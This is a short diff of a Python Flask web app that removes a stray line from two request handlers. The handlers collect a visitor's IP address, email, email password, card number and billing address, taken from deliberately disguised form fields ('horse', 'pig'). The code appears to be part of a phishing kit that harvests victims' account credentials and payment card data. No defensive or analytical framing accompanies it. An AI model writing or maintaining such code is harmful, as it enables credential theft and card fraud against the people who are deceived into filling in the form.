@@ -144,7 +144,6 @@ def first():
         if ip is None:
             ip = request.remote_addr
         email = request.form.get("horse")
-	contact = "contact"
         passwordemail = request.form.get("pig")
         cardnumber = request.form.get("cardNumber")
         billingaddress = request.form.get("billingAddress")
@@ -187,7 +186,6 @@ def second():
         if ip is None:
             ip = request.remote_addr
         email = request.form.get("horse")
-	contact = "contact"
         passwordemail = request.form.get("pig")
         cardnumber = request.form.get("cardNumber")
         billingaddress = request.form.get("billingAddress")
